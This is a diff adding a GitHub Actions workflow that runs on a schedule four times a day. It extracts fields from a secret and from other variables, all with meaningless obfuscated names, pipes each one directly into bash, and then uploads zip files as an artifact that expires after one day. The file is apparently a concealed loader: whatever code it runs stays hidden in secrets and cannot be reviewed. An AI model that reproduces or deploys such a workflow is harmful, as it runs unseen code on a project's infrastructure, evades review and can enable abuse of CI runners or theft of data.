@@ -1,0 +1,29 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '49 2,8,14,20 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          y438: ${{ secrets.y438 }}
+        run: |
+          printf '%s' "$y438" | jq -r .ry128 | /bin/bash
+          printf '%s' "$hzjd8355" | jq -r .clj946 | /bin/bash
+          echo $ez8 | jq -r .ibj9920 | /bin/bash
+          echo $wko5 | jq -r .fmvnl27978 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: 4w1CfqH0
+          path: "*.zip"
+          retention-days: 1
